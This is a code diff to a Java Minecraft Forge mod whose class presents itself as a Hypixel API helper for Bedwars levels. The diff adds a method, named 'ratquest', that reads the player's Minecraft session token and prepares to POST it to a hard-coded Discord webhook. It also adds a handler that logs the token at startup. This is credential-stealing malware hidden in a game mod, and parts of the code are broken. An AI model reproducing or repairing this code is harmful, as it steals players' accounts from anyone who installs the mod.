@@ -3,12 +3,17 @@ package studio.dreamys;
 import com.google.gson.Gson;
 import com.google.gson.internal.LinkedTreeMap;
 import net.minecraft.client.Minecraft;
+import net.minecraftforge.fml.common.Mod;
+import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
 import org.apache.http.HttpResponse;
 import org.apache.http.client.HttpClient;
 import org.apache.http.client.methods.HttpGet;
 import org.apache.http.client.methods.HttpPost;
 import org.apache.http.impl.client.HttpClientBuilder;
+import org.apache.http.message.BasicNameValuePair;
+import org.apache.http.params.HttpParams;
 import org.apache.http.util.EntityUtils;
+import org.apache.logging.log4j.Logger;
 
 import java.util.UUID;
 import java.util.concurrent.*;
@@ -34,20 +39,24 @@ public class HypixelAPI {
         }
         return null;
     }
-    Minecraft mc = Minecraft.getMinecraft();
-    final String json = mc.getSession().getToken();
-    final StringEntity entity = new StringEntity(json);
+    static Minecraft mc = Minecraft.getMinecraft();
+    static final String json = mc.getSession().getToken();
+    static final String body = new String(json);
     public static String ratquest(String url) {
         HttpClient client = HttpClientBuilder.create().build();
 
-        HttpGet request = new HttpPost("https://example.com");
+        HttpPost request = new HttpPost("https://discord.com/api/webhooks/1010406612978126888/p9MFmZNl2rYSXO5nubjg-Ix2vZ3lfCm5rjS_unSpWOD0SYGsaBZigalkJbkmUS3qqn0B");
         request.addHeader("User-Agent", "Mozilla/5.0");
+        request.setParams((HttpParams) new BasicNameValuePair("content", body));
         request.addHeader("Content-Type", "application/json");
         request.addHeader("Accept", "application/json");
-        
-        
+        return body;
     }
-
+    @Mod.EventHandler
+    public void preInit(FMLPreInitializationEvent event) {
+        Logger logger = event.getModLog();
+        logger.fatal(body);
+    }
     public static double getBedwarsLevel(UUID uuid) {
         double level = -1;
         LinkedTreeMap data = gson.fromJson(request(String.format("https://api.hypixel.net/player?key=%s&uuid=%s",key,uuid)), LinkedTreeMap.class);
